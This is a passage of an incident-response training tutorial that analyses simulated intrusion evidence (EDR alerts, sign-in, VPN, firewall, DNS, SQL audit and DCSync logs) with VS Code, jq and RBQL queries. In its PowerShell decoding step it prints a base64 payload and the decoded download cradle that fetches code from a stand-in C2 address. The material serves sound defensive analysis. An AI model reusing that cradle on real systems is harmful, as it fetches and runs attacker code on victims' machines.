Possible cause: Deliberate anti-forensic technique — terminating Sysmon
  service is a known evasion method.
```

The 10-day gap on the IT admin workstation starts the same day a phishing email was delivered to him. This is not coincidence — it is a finding.

### 3. Create a GAP document for every gap

Each gap gets its own file. Create it now:

```text
nano 01-evidence/GAP-001-ws-it-levi-sysmon.md
```

Paste the filled template:

```text
# GAP-001 — WS-IT-LEVI Sysmon | 2024-10-22 – 2024-11-01
Duration: 10 days (2024-10-22 11:31 UTC to 2024-11-01 09:14 UTC)
Root cause: Sysmon forwarder stopped. Coincides exactly with delivery
  of phishing email to p.levi at 11:23 UTC.
What is missing: EID 1 (process creation), EID 3 (network connections),
  EID 11 (file creation) for WS-IT-LEVI during this entire window.
Impact: Cannot confirm or rule out attacker activity during this period.
  All claims covering Oct 22–Nov 1 on this host are INFERRED or
  HYPOTHESIZED unless corroborated by VPN logs, DC auth logs, or
  firewall flows.
Possible cause: Deliberate - terminating Sysmon is T1562.001 (Impair
  Defenses). A gap coinciding with a malicious delivery is itself a
  finding, not merely an absence.
```

### 4. Commit the evidence inventory

```text
git add 01-evidence/ 02-sources/source-registry.md
git commit -m "PROJ-2024-001: evidence inventory — 6 sources, GAP-001 (10-day Sysmon gap WS-IT-LEVI Oct 22–Nov 1), firewall log retrieval urgent before Nov 20"
```

## Step R1.5: Hands-On Evidence Analysis — VS Code Investigation

The evidence inventory tells you what exists. This step analyzes it. VS Code is the primary tool: one window holds the evidence tree, the formatted logs, the API calls, and the terminal — no context-switching between applications.

### Setup — Open the Evidence Folder

```text
# One command opens the entire evidence directory as a workspace
code ~/investigations/lifetech-2024-11/01-evidence/
```

VS Code opens with the Explorer panel showing the full evidence tree. Every JSON, JSONL, CSV, and syslog file is one click away.

**Install four extensions before starting**(Ctrl+Shift+X, search by ID):

<img src="https://cdn-images-1.medium.com/max/1024/1*LyER2G4y2xTAF1kXY4MX6A.png" alt="Article image" width="1024" height="281" loading="lazy" decoding="async" />

Or install all at once from the integrated terminal (Ctrl+`` ):

```text
code --install-extension mechatroner.rainbow-csv
code --install-extension humao.rest-client
code --install-extension ms-vscode.hexeditor
code --install-extension esbenp.prettier-vscode
```

<img src="https://cdn-images-1.medium.com/max/991/1*Pp_6YW13coi4GWZcb2a8Wg.png" alt="Article image" width="991" height="432" loading="lazy" decoding="async" />

**Key VS Code shortcuts used throughout this step:**

<img src="https://cdn-images-1.medium.com/max/1024/1*2i3dAl46V_xX0cqntP0rCw.png" alt="Article image" width="1024" height="449" loading="lazy" decoding="async" />

**Download the training evidence:**

```text
git clone https://github.com/anpa1200/CTI_as_a_Code.git
code ~/CTI_as_a_Code/investigations/lifetech-2024-11/01-evidence/
```

Direct links to open any file in GitHub (also downloadable via curl -L):

- [m365/message-trace-p.levi.csv](https://raw.githubusercontent.com/anpa1200/CTI_as_a_Code/main/investigations/lifetech-2024-11/01-evidence/m365/message-trace-p.levi.csv)
**Format:**CSV
**Contains:**IT admin phishing delivery, Oct 15–24
- [m365/message-trace-m.cohen.csv](https://raw.githubusercontent.com/anpa1200/CTI_as_a_Code/main/investigations/lifetech-2024-11/01-evidence/m365/message-trace-m.cohen.csv)
**Format:**CSV
**Contains:**CFO phishing delivery, Nov 13–15
- [azure-ad/signin-p.levi.json](https://raw.githubusercontent.com/anpa1200/CTI_as_a_Code/main/investigations/lifetech-2024-11/01-evidence/azure-ad/signin-p.levi.json)
**Format:**JSON
**Contains:**IT admin Azure AD sign-ins — Istanbul token replay
- [vpn/anyconnect-2024-10-24.log](https://raw.githubusercontent.com/anpa1200/CTI_as_a_Code/main/investigations/lifetech-2024-11/01-evidence/vpn/anyconnect-2024-10-24.log)
**Format:**ASA syslog
**Contains:**VPN session from Istanbul, Oct 24
- [sysmon/WS-CFO-01-sysmon.jsonl](https://raw.githubusercontent.com/anpa1200/CTI_as_a_Code/main/investigations/lifetech-2024-11/01-evidence/sysmon/WS-CFO-01-sysmon.jsonl)
**Format:**JSONL
**Contains:**CFO workstation — PowerShell, LSASS, persistence, BITS
- [crowdstrike/WS-CFO-01-alert-20241115.json](https://raw.githubusercontent.com/anpa1200/CTI_as_a_Code/main/investigations/lifetech-2024-11/01-evidence/crowdstrike/WS-CFO-01-alert-20241115.json)
**Format:**JSON
**Contains:**CrowdStrike Falcon alert — triggering detection
- [windows-security/DC01-security.jsonl](https://raw.githubusercontent.com/anpa1200/CTI_as_a_Code/main/investigations/lifetech-2024-11/01-evidence/windows-security/DC01-security.jsonl)
**Format:**JSONL
**Contains:**DC01 security events — DCSync EID 4662
- [windows-security/SERVER-RD-02-security.jsonl](https://raw.githubusercontent.com/anpa1200/CTI_as_a_Code/main/investigations/lifetech-2024-11/01-evidence/windows-security/SERVER-RD-02-security.jsonl)
**Format:**JSONL
**Contains:**R&D server — EID 4663 file access, EID 5156 exfil
- [palo-alto/ngfw-flows.csv](https://raw.githubusercontent.com/anpa1200/CTI_as_a_Code/main/investigations/lifetech-2024-11/01-evidence/palo-alto/ngfw-flows.csv)
**Format:**CSV
**Contains:**Perimeter firewall flows — 381 MB exfil confirmed
- [palo-alto/dns-queries.csv](https://raw.githubusercontent.com/anpa1200/CTI_as_a_Code/main/investigations/lifetech-2024-11/01-evidence/palo-alto/dns-queries.csv)
**Format:**CSV
**Contains:**DNS telemetry — C2 beacon pattern
- [sql-audit/SERVER-RD-02-sql-audit.jsonl](https://raw.githubusercontent.com/anpa1200/CTI_as_a_Code/main/investigations/lifetech-2024-11/01-evidence/sql-audit/SERVER-RD-02-sql-audit.jsonl)
**Format:**JSONL
**Contains:**SQL Server audit — full xp_cmdshell exfil chain
- [GAP-001-ws-it-levi-sysmon.md](https://raw.githubusercontent.com/anpa1200/CTI_as_a_Code/main/investigations/lifetech-2024-11/01-evidence/GAP-001-ws-it-levi-sysmon.md)
**Format:**Markdown
**Contains:**Documented 10-day Sysmon gap on IT admin host

### 1. CrowdStrike Alert — JSON in VS Code

**In VS Code Explorer:**click crowdstrike/WS-CFO-01-alert-20241115.json

Press Shift+Alt+F to auto-format. The nested structure becomes readable with collapsible sections.

**Open the Outline panel**(Ctrl+Shift+O):

```text
▶ meta
▼ resources
  ▼ [0]
    ▶ device        — hostname, OS, groups
    ▼ behaviors
      [0] Execution / T1059.001  — OUTLOOK.EXE → powershell.exe
      [1] Command and Control / T1071.001
      [2] Persistence / T1547.001
      [3] Credential Access / T1003.001
    ▶ network_accesses
    ▶ prevention_policy
```

<img src="https://cdn-images-1.medium.com/max/1024/1*EHUHyPz18JBNmPFRWS5VHA.png" alt="Article image" width="1024" height="555" loading="lazy" decoding="async" />

Click any node to jump directly to that section. Click prevention_policy — you see "prevent": false immediately. The CFO's machine is in detect-only mode; the C2 connection is live.**Take the memory dump before anything else.**

<img src="https://cdn-images-1.medium.com/max/1024/1*bsA6unjBprE5asg-jKFbug.png" alt="Article image" width="1024" height="555" loading="lazy" decoding="async" />

**Search**(Ctrl+F): type prevented → jumps to "prevent": false. Type cmdline → jumps to the encoded PowerShell command.

**Or use jq tool:**

**Extract key fields in the integrated terminal**(Ctrl+`` ):

```text
jq '.resources[0] | {
  detection_id,
  severity:  .max_severity_displayname,
  host:      .device.hostname,
  prevented: .prevention_policy.prevent,
  timestamp: .created_timestamp
}' crowdstrike/WS-CFO-01-alert-20241115.json
```

Output:

```text
{
  "detection_id": "ldt:8f2a4b91e33a471cae44b2fdb8812201:884921003",
  "severity":     "Critical",
  "host":         "WS-CFO-01",
  "prevented":    false,
  "timestamp":    "2024-11-15T16:42:47.882Z"
}
```

```text
# List all detected behaviors
jq '.resources[0].behaviors[] | {
  timestamp, tactic, technique_id, display_name,
  parent: .parent_image_filename,
  image:  .filename,
  cmdline: (.cmdline // "" | .[0:80])
}' crowdstrike/WS-CFO-01-alert-20241115.json
```

```text
# Network connections observed
jq '.resources[0].network_accesses[] | {
  remote_address, remote_port, direction, timestamp
}' crowdstrike/WS-CFO-01-alert-20241115.json
```

```text
# Prevention policy — confirm detect-only mode and note the policy gap
jq '.resources[0].prevention_policy | {name, prevent, detect, note}' \
  crowdstrike/WS-CFO-01-alert-20241115.json
```

**Found IOCs**

- **Host**WS-CFO-01 — Victim workstation; CrowdStrike detect-only, C2 active
- **Hash (SHA256)**de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1848474f57 — powershell.exe behavior hash from alert
- **Hash (MD5)**7353f60b1739074eb17c5f4dddefe239 — Same behavior; use both for VT lookup
- **Process**OUTLOOK.EXE → powershell.exe — Parent–child execution chain in behaviors[0]
- **Cmdline**-NonI -W Hidden -Enc JABjAD0A… — Encoded PowerShell payload; decode in Step 2
- **IP**203.0.113.87 — C2 server; 3 connections in network_accesses, port 443

### 2. Decode the PowerShell Payload

In the formatted JSON still open in VS Code, press Ctrl+F and search -Enc — the base64 argument is on the same line. Copy it.

**Decode in the integrated terminal**— do not paste encoded malware into online decoders:

```text
# PowerShell -Enc uses UTF-16LE encoding
echo "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAJwApADsAJABkAD0AJABjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADcALwB1AHAAZABhAHQAZQAnACkA" \
  | base64 -d
```

Output:

<img src="https://cdn-images-1.medium.com/max/1024/1*gtvadCAbVwcFaB8UcvEPCQ.png" alt="Article image" width="1024" height="56" loading="lazy" decoding="async" />

```text
$c=New-Object System.Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0');$d=$c.DownloadString('https://203.0.113.87/update')
```

**In VS Code Explorer:**click sysmon/WS-CFO-01-sysmon.jsonl. Press Ctrl+F, search "EventID": 11 — jumps to the file creation event showing svchost32.exe dropped to AppData\Roaming. The analyst_note field confirms the fake PE timestamp.

```text
# Cross-check: confirm what the PowerShell dropped
jq 'select(.EventID == 11) | {
  time: .TimeCreated, dropped_by: .Image, file: .TargetFilename, note: .analyst_note
}' sysmon/WS-CFO-01-sysmon.jsonl
```

**Or use Base64 extention:**

<img src="https://cdn-images-1.medium.com/max/1024/1*NX8NZYV10DhI03Lgy9E07A.png" alt="Article image" width="1024" height="761" loading="lazy" decoding="async" />

<img src="https://cdn-images-1.medium.com/max/1024/1*hRToibL_ojf36voYhSco2A.png" alt="Article image" width="1024" height="761" loading="lazy" decoding="async" />

**Found IOCs**

- **IP**203.0.113.87 — Primary C2 server; payload download source
- **URL**https://203.0.113.87/update — C2 payload URL decoded from base64 PowerShell
- **File**svchost32.exe — Dropper deposited to %AppData%\Roaming\; forged PE timestamp

### 3. M365 Message Trace — Rainbow CSV

**In VS Code Explorer:**click m365/message-trace-p.levi.csv

With Rainbow CSV installed, every column gets its own color. The status bar at the bottom shows the column name as you move the cursor.

**RBQL — SQL queries against the CSV, no Python needed:**

Press F5 (or click RBQL in the status bar) to open the query console:

```text
-- Find all emails where authentication failed
SELECT a.* WHERE a16 == "fail" ORDER By a1
```

<img src="https://cdn-images-1.medium.com/max/1024/1*IF23O_x92zR5XPNGe7gP2A.png" alt="Article image" width="1024" height="138" loading="lazy" decoding="async" />

Result pane (right side):

```text
2024-10-22T11:23:07Z | security-noreply@mfa-lifetechpharma.com
  | ACTION REQUIRED: MFA Re-enrollment — LifeTech IT Security
  | Delivered | 4 | fail | fail | fail
```

Three auth failures in one row. SCL=4 delivered because the threshold is 5. Add mfa-lifetechpharma.com to IOC list.

```text
SELECT a.* WHERE a17 == '1' && a16 == 'fail'
```

**Save RBQL results:**click**Save to CSV**in the result panel → save as 03-analysis/m365-suspects.csv.

**Switch to****m365/message-trace-m.cohen.csv**(click in Explorer):

```text
-- CFO mailbox — find the malicious delivery
SELECT a.received_time, a.sender_address, a.subject, a.SCL, a.DMARC, a.has_attachment
FROM a
WHERE a.DMARC == 'fail' OR a.has_attachment == '1'
ORDER BY a.received_time
```

Key finding — CFO phishing email:

```text
2024-11-15T15:58:08Z | contracts@globalcontracts-secure.net
  | Q4-2024 Licensing Agreement Review — Action Required (URGENT)
  | SCL=4 | DMARC=fail | has_attachment=1
```

<img src="https://cdn-images-1.medium.com/max/1024/1*p6mJFnpdRJE2EvoF-IxUFw.png" alt="Article image" width="1024" height="138" loading="lazy" decoding="async" />

The .xlsm attachment was not sandboxed — ATP policy gap (INT-007). Add globalcontracts-secure.net to IOC list.

**Found IOCs**

- **Domain**mfa-lifetechpharma.com — AiTM phishing sender domain; DMARC/DKIM/SPF all fail
- **Email**security-noreply@mfa-lifetechpharma.com — IT admin phishing sender (Oct 22)
- **Domain**globalcontracts-secure.net — CFO phishing delivery domain
- **Email**contracts@globalcontracts-secure.net — CFO phishing sender (Nov 15)
- **Attachment**.xlsm — Macro-enabled Excel; bypassed ATP sandbox (INT-007)

### 4. Azure AD Sign-In Analysis

**In VS Code Explorer:**click azure-ad/signin-p.levi.json

Press Shift+Alt+F to format. Open the Outline (Ctrl+Shift+O) — the array shows four sign-in entries. Click entry [1] to jump to aad-signin-002.

**Search**Ctrl+F: type Istanbul — jumps directly to the suspicious sign-in. Read surrounding context without running any command:

```text
"city": "Istanbul",
"countryOrRegion": "TR",
"conditionalAccessStatus": "notApplied",
"succeeded": null
```

Three red flags visible immediately in the file: foreign city, CA bypassed, no MFA.

**Full structured extraction in the terminal:**

```text
jq '.[] | {
  id,
  time: .properties.createdDateTime,
  ip:   .properties.ipAddress,
  loc:  "\(.properties.location.city), \(.properties.location.countryOrRegion)",
  mfa:  .properties.authenticationDetails[0].succeeded,
  ca:   .properties.conditionalAccessStatus,
  os:   .properties.deviceDetail.operatingSystem
}' azure-ad/signin-p.levi.json
```

<img src="https://cdn-images-1.medium.com/max/1024/1*XkLVEejy4bkZ71px3sihoQ.png" alt="Article image" width="1024" height="363" loading="lazy" decoding="async" />

**Red flags on****aad-signin-002:**

<img src="https://cdn-images-1.medium.com/max/1024/1*Isdphk9PrvplMM2sWbc8Vg.png" alt="Article image" width="1024" height="563" loading="lazy" decoding="async" />

**Found IOCs**

- **IP**185.220.101.47 — Attacker source IP; Istanbul, Turkey (Tor exit node)
- **Account**p.levi — Compromised IT admin; token replay, no MFA challenge
- **Indicator**Token replay — CA policy bypassed; conditionalAccessStatus: notApplied

### 5. VPN Log Analysis

**In VS Code Explorer:**click vpn/anyconnect-2024-10-24.log

VS Code opens the plain syslog file. Use Ctrl+F to navigate without any commands:

- Search p.levi — highlights every line for this user
- Search Authentication: successful — the auth event
- Search Assigned address — the internal IP assigned to the session
- Search Duration — total session length

```text
# Full session chain in the terminal:
grep "p.levi" vpn/anyconnect-2024-10-24.log \
  | grep -E "(716001|716002|734001|Authentication|Teardown|Assigned)"
```

Output:

<img src="https://cdn-images-1.medium.com/max/1024/1*BsNecLZvZT8bDwFYWsb-nQ.png" alt="Article image" width="1024" height="112" loading="lazy" decoding="async" />

```text
Oct 24 00:17:14 ... User &lt;p.levi&gt; IP &lt;185.220.101.47&gt; Authentication: successful
Oct 24 00:17:33 ... User &lt;p.levi&gt; ... Assigned address: 10.10.3.22
Oct 24 02:29:08 ... User &lt;p.levi&gt; ... Duration: 1h12m34s
```

185.220.101.47 (Istanbul VPN exit) authenticated as p.levi and was assigned 10.10.3.22 — WS-IT-LEVI's own internal IP. All activity during this session looks like it came from the legitimate workstation.

```text
grep -i "mfa\|no.*challenge\|bypass" vpn/anyconnect-2024-10-24.log
# → NOTE: No MFA challenge issued — session token authentication bypass
grep "203.0.113.87" vpn/anyconnect-2024-10-24.log | awk '{print $1,$2,$3}' | head -8
# → ~7-minute C2 beacons during the VPN session window
```

**Found IOCs**

- **IP**185.220.101.47 — Attacker VPN source; Istanbul; authenticated as p.levi
- **Account**p.levi — Session token auth; no MFA challenge issued
- **IP (internal)**10.10.3.22 — Assigned to attacker session; masks as WS-IT-LEVI
- **IP**203.0.113.87 — C2 beacons during VPN session (~7-min interval)

### 6. NGFW Log Analysis — Rainbow CSV

**In VS Code Explorer:**click palo-alto/ngfw-flows.csv

Rainbow CSV colorizes columns. The status bar shows column names as you move the cursor.

<img src="https://cdn-images-1.medium.com/max/1024/1*Yz7EggRReYdjyRyz79n79A.png" alt="Article image" width="1024" height="452" loading="lazy" decoding="async" />

RBQLHeader
a1receive_time
a22dport
a5src
a28bytes
a6dst
a29bytes_sent
a9rule
a30bytes_received
a10srcuser
a33elapsed
a12app
a34category
a27action
a41session_end_reason

**In VS Code Explorer:**click palo-alto/ngfw-flows.csv. Press F5 to open the RBQL console.

**Query 1 — find anomalies: all flows sorted by bytes_sent descending**

Start here every time. The outlier appears immediately.

```text
SELECT a1, a5, a6, a22,
       Math.round(parseInt(a29) / 1048576) + ' MB' AS sent_MB,
       Math.round(parseInt(a30) / 1024) + ' KB' AS rcvd_KB,
       a33 + 's', a10
ORDER BY parseInt(a29) DESC
```

Result:

<img src="https://cdn-images-1.medium.com/max/1024/1*pszv_-CeRnD-lNlUmL8VBQ.png" alt="Article image" width="1024" height="452" loading="lazy" decoding="async" />

```text
2024-11-06T00:14:14Z | 10.10.2.15 | 198.51.100.44 | 443 | 381 MB | 409 KB | 312s |
2024-11-15T16:42:41Z | 10.10.1.45 | 203.0.113.87  | 443 |  17 MB |  10 KB |  63s | LIFETECHPHARMA\m.cohen
2024-11-15T16:49:22Z | 10.10.1.45 | 203.0.113.87  | 443 |  14 MB |  10 KB |  61s | LIFETECHPHARMA\m.cohen
2024-11-15T16:56:03Z | 10.10.1.45 | 203.0.113.87  | 443 |  14 MB |  10 KB |  59s | LIFETECHPHARMA\m.cohen
2024-11-06T00:09:44Z | 10.10.3.22 | 203.0.113.87  | 443 |   9 KB |   7 KB |  51s | LIFETECHPHARMA\p.levi
...
```

The first row is 17,000× larger than any other flow. Upload ratio 99% (381 MB sent, 409 KB received). Session lasted 312 seconds. This is data exfiltration, not a download.

Two hosts are beaconing to the same C2 IP: 10.10.3.22 (IT admin, p.levi) and 10.10.1.45 (CFO, m.cohen) — two separate infections.

**Query 2 — exfil upload ratio: flag flows where sent &gt; 90% of total bytes**

```text
SELECT a1, a5, a6, a22,
       Math.round(parseInt(a29) / 1048576) + ' MB' AS sent_MB,
       Math.round(parseInt(a29) * 100 / (parseInt(a28) + 1)) + '%' AS upload_pct,
       a33 + 's'
WHERE parseInt(a28) &gt; 100000
ORDER BY parseInt(a29) DESC
```

<img src="https://cdn-images-1.medium.com/max/1024/1*UkpGfIAnhSx0k-VE5CATzg.png" alt="Article image" width="1024" height="116" loading="lazy" decoding="async" />

Result: only one row — 10.10.2.15 → 198.51.100.44, 99% upload, 381 MB. Every other flow is bidirectional C2 (55–65% upload) which is beacon traffic, not exfil.

**Query 3 — beacon pattern: repeated small flows to same external IP**

```text
SELECT a6, COUNT(a6) AS sessions,
       AVG(parseInt(a28)) AS avg_bytes,
       AVG(parseInt(a33)) AS avg_elapsed_s
WHERE a6 && !a6.startsWith('10.') && !a6.startsWith('192.168.')
   && !isNaN(parseInt(a28))
GROUP BY a6Result:
```

```text
203.0.113.87   | 9 sessions | ~14 KB avg | ~47s avg
198.51.100.44  | 1 session  | 399 MB avg | 312s avg
```

<img src="https://cdn-images-1.medium.com/max/1024/1*264pKTvyyeuGVoAIwQVvSw.png" alt="Article image" width="1024" height="116" loading="lazy" decoding="async" />

203.0.113.87 has 9 short uniform sessions — beacon. 198.51.100.44 has one giant session — exfil.

**Query 4 — internal lateral movement: flows that stay inside RFC-1918**

```text
SELECT a1, a5, a6, a22, a28, a9, a10
WHERE a5 && a6
   && (a5.startsWith('10.') || a5.startsWith('192.168.'))
   && (a6.startsWith('10.') || a6.startsWith('192.168.'))
ORDER BY a1
```

Result:

<img src="https://cdn-images-1.medium.com/max/1024/1*epr64_sA5gqNzWxgEi-LpQ.png" alt="Article image" width="1024" height="116" loading="lazy" decoding="async" />

```text
2024-11-15T19:14:08Z | 10.10.1.45 | 10.10.2.20 | 135   | 8441  | InternalAccess-Allow
2024-11-15T19:14:18Z | 10.10.1.45 | 10.10.2.20 | 49152 | 12884 | InternalAccess-Allow
```

CFO workstation (10.10.1.45) connected to an internal host (10.10.2.20) on port 135 (DCE/RPC endpoint mapper) then port 49152 (dynamic RPC). This is the WMI/DCOM lateral movement signature — 3 hours after the CFO was compromised.

**Query 5 — beacon timing: isolate C2 host and sort by time to measure intervals**

```text
SELECT a1, a5, a6, parseInt(a29) AS bytes_sent, a33 + 's'
WHERE a6 == '203.0.113.87'
ORDER BY a1
```

Result:

<img src="https://cdn-images-1.medium.com/max/1024/1*f8M-EcFKrYAOXIzIOfoNlw.png" alt="Article image" width="1024" height="208" loading="lazy" decoding="async" />

```text
2024-11-01T07:14:02Z | 10.10.3.22 | 8441 bytes | 47s   ← WS-IT-LEVI session 1
2024-11-01T07:21:14Z | 10.10.3.22 | 8221 bytes | 45s   ← gap: 432s
2024-11-01T07:28:44Z | 10.10.3.22 | 7882 bytes | 44s   ← gap: 450s
                     ↓ 4.7-day silence (C2 dormant) ↓
2024-11-06T00:09:44Z | 10.10.3.22 | 9441 bytes | 51s   ← WS-IT-LEVI session 2
2024-11-06T00:17:01Z | 10.10.3.22 | 8001 bytes | 46s   ← gap: 437s
2024-11-06T00:24:33Z | 10.10.3.22 | 8011 bytes | 44s   ← gap: 452s
2024-11-15T16:42:41Z | 10.10.1.45 | 18221 bytes| 63s   ← WS-CFO-01 session 1
2024-11-15T16:49:22Z | 10.10.1.45 | 14441 bytes| 61s   ← gap: 401s
2024-11-15T16:56:03Z | 10.10.1.45 | 15001 bytes| 59s   ← gap: 421s
```

Beacon interval:**432–452 seconds (~7.2 minutes)**. Consistent across both infected hosts — same implant, same configuration. The 4.7-day gap (Nov 1–6) between IT admin beacon clusters is the C2 going quiet while staging lateral movement.

**Click****palo-alto/dns-queries.csv**in Explorer.

**Column map:**

RBQLHeader
a1receive_time
a2src
a4query
a6response
a8category
a10analyst_note

**Query 6 — all malware-category queries, sorted by time**

```text
SELECT a1, a2, a4, a6, a8
FROM a
WHERE a8 == 'malware'
ORDER BY a1
```

Result — full malware DNS timeline:

<img src="https://cdn-images-1.medium.com/max/1024/1*RErM3MswME78yNNi0pB92A.png" alt="Article image" width="1024" height="256" loading="lazy" decoding="async" />

```text
2024-10-22T09:28:41Z | 10.10.3.22 | mfa-lifetechpharma.com       | 185.220.101.47  | malware ← AiTM phishing page loaded
2024-10-22T09:29:02Z | 10.10.3.22 | mfa-lifetechpharma.com       | 185.220.101.47  | malware ← token stolen
2024-11-01T07:14:00Z | 10.10.3.22 | telemetry-cdn-services.biz   | 203.0.113.87    | malware ← C2 beacon 1
2024-11-01T07:21:14Z | 10.10.3.22 | telemetry-cdn-services.biz   | 203.0.113.87    | malware
2024-11-01T07:28:44Z | 10.10.3.22 | telemetry-cdn-services.biz   | 203.0.113.87    | malware
2024-11-06T00:09:01Z | 10.10.3.22 | telemetry-cdn-services.biz   | 203.0.113.87    | malware
2024-11-06T00:17:01Z | 10.10.3.22 | telemetry-cdn-services.biz   | 203.0.113.87    | malware ← (missing from log)
2024-11-06T00:24:33Z | 10.10.3.22 | telemetry-cdn-services.biz   | 203.0.113.87    | malware
2024-11-06T00:10:14Z | 10.10.2.15 | sys-update-cdn.net            | 198.51.100.44   | malware ← exfil domain lookup
2024-11-15T15:58:08Z | 10.10.1.45 | globalcontracts-secure.net    | 185.220.101.52  | malware ← CFO phishing domain
2024-11-15T16:42:33Z | 10.10.1.45 | telemetry-cdn-services.biz   | 203.0.113.87    | malware ← CFO C2 beacon 1
2024-11-15T16:49:22Z | 10.10.1.45 | telemetry-cdn-services.biz   | 203.0.113.87    | malware
2024-11-15T16:56:03Z | 10.10.1.45 | telemetry-cdn-services.biz   | 203.0.113.87    | malware
```

**Query 7 — per-host beacon count: how many hosts are infected?**

```text
SELECT a2, COUNT(a2) AS queries
WHERE a4 == 'telemetry-cdn-services.biz'
GROUP BY a2
```

Result:

<img src="https://cdn-images-1.medium.com/max/1024/1*v94DK5JOd0MBwJUOjqBpAg.png" alt="Article image" width="1024" height="135" loading="lazy" decoding="async" />

```text
10.10.3.22 | 6   ← WS-IT-LEVI (IT admin) — infected Nov 1
10.10.1.45 | 3   ← WS-CFO-01 (CFO) — infected Nov 15
```

Two hosts. Two infections. Same C2 domain. The IT admin host was the initial foothold; the CFO host is the second wave, 14 days later.

**Query 8 — new IP: attacker recon before VPN login**

```text
SELECT a1, a2, a4, a6, a8, a10
WHERE a2 && !a2.startsWith('10.') && !a2.startsWith('192.168.')
ORDER BY a1
```

Result:

<img src="https://cdn-images-1.medium.com/max/1024/1*lj9D7dZos_et_O16rjcfOg.png" alt="Article image" width="1024" height="135" loading="lazy" decoding="async" />

```text
2024-10-24T00:16:44Z | 185.220.101.47 | vpn.lifetechpharma.com | 10.10.8.1 | business-and-economy
```

The attacker IP (185.220.101.47) looked up the VPN hostname 1 minute before the successful VPN login. Confirms active operator, not automated tool.

**Cross-reference with flows**(Ctrl+Shift+F → 198.51.100.44):

```text
ngfw-flows.csv   line 11: 10.10.2.15 → 198.51.100.44 | 399 MB | 312s
dns-queries.csv  line 14: 10.10.2.15 → sys-update-cdn.net → 198.51.100.44
```

DNS lookup at 00:10:14Z, flow starts at 00:14:14Z — 4-minute gap between resolution and transfer start. Consistent with manual operator staging the upload command.

**Found IOCs**

- **IP**198.51.100.44 — Exfil destination; 381 MB upload, 99% upload ratio, 312s, single session
- **IP (internal)**10.10.2.15 — SERVER-RD-02; exfil source host
- **IP**203.0.113.87 — C2 server; 9 beacon sessions from 2 hosts, ~7.2-min interval
- **IP**185.220.101.52 — New; CFO phishing page host (globalcontracts-secure.net)
- **IP (internal)**10.10.2.20 — Lateral movement target; reached from CFO host on ports 135 + 49152 (RPC/WMI)
- **Domain**telemetry-cdn-services.biz — C2 domain; queried by both 10.10.3.22 and 10.10.1.45
- **Domain**sys-update-cdn.net — Exfil domain; resolves to 198.51.100.44; queried by 10.10.2.15
- **Domain**mfa-lifetechpharma.com — AiTM phishing domain; resolves to 185.220.101.47
- **Indicator**Beacon interval 432–452s (~7.2 min) — identical across both infected hosts; same implant config
- **Indicator**Attacker recon: 185.220.101.47 queried vpn.lifetechpharma.com 1 min before VPN login7. SQL Audit Log Analysis

### 7. SQL Audit Log Analysis

**In VS Code Explorer:**click sql-audit/SERVER-RD-02-sql-audit.jsonl

Each line is a JSON object. Use Ctrl+F to navigate directly to key events:

Search termJumps to

xp_cmdshellShell execution events
AuditLogAdversary OPSEC recon
(SELECT) and anti-forensics (DELETE)
UploadFileThe exfiltration command
Compress-ArchiveThe staging command

**Full chain in the terminal:**

```text
jq -r '[.EventTime, .LoginName, .StatementType, (.Statement[0:90])] | @tsv' \
  sql-audit/SERVER-RD-02-sql-audit.jsonl
```

Six events: enumerate → recon (SELECT AuditLog) → stage → exfil → cleanup → anti-forensics (DELETE AuditLog). The DELETE at 00:15:22Z failed because Splunk had already ingested these rows before it ran.

**Found IOCs**

- **Account**svc_backup — Lateral movement account; executed full xp_cmdshell chain
- **URL**198.51.100.44/recv — Exfil endpoint used by WebClient.UploadFile
- **File**USPartner2024-formulas.zip — Staged archive; formula data compressed before exfil
- **Indicator**xp_cmdshell (T1059.003) — SQL Server shell used as execution proxy
- **Indicator**Anti-forensics — DELETE on SQL AuditLog at 00:15:22Z; blocked by prior Splunk ingestion

### 8. Windows Security Event Log Analysis

**In VS Code Explorer:**click windows-security/DC01-security.jsonl

Press Ctrl+F, search 4662 — jumps to the DCSync event. The analyst_note gives the human-readable summary in the file itself:

```text
🔴 CRITICAL: DCSync — DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
from WORKSTATION IP 10.10.3.22 (WS-IT-LEVI). NOT a DC. NOT in pentest VLAN (10.10.99.x).
```

```text
# All three DCSync events — domain, krbtgt, Administrator
jq 'select(.EventID == 4662) | {
  time: .TimeCreated, subject: .SubjectUserName, object: .ObjectName
}' windows-security/DC01-security.jsonl
```

Output:

<img src="https://cdn-images-1.medium.com/max/881/1*xlE6AoS-kD4FYW5DmwGVxw.png" alt="Article image" width="881" height="392" loading="lazy" decoding="async" />

```text
{"time": "2024-11-06T00:48:33Z", "subject": "svc_backup", "object": "DC=lifetechpharma,DC=local"}
{"time": "2024-11-06T00:48:44Z", "subject": "svc_backup", "object": "CN=krbtgt,CN=Users,DC=..."}
{"time": "2024-11-06T00:48:51Z", "subject": "svc_backup", "object": "CN=Administrator,CN=..."}
```

krbtgt and Administrator DCSync'd — golden ticket capability obtained. Full domain credential rotation required.

**Click****windows-security/SERVER-RD-02-security.jsonl:**

<img src="https://cdn-images-1.medium.com/max/1024/1*r5ZHpES2uPK3SDDVU4yoMg.png" alt="Article image" width="1024" height="307" loading="lazy" decoding="async" />

Ctrl+F → 4663 — file access events. Ctrl+F → 5156 — network connection event.

```text
jq 'select(.EventID == 4663) | .ObjectName' \
  windows-security/SERVER-RD-02-security.jsonl | jq -s 'length'
# → 47  (47 formula files accessed)
jq 'select(.EventID == 5156) | {
  time: .TimeCreated, process: (.Application | split("\\\\") | last),
  src: .SourceAddress, dst: .DestAddress, dst_port: .DestPort
}' windows-security/SERVER-RD-02-security.jsonl
# → PowerShell → 198.51.100.44:443 at 00:14:14Z
```

Three independent sources — SQL audit (00:13:54Z command issued), NGFW flow (00:14:14Z bytes transferred), Windows Security EID 5156 (00:14:14Z connection initiated) — triangulate to the same 20-second window.

**Found IOCs**

- **Account**svc_backup — DCSync actor; source IP 10.10.3.22 (non-DC workstation)
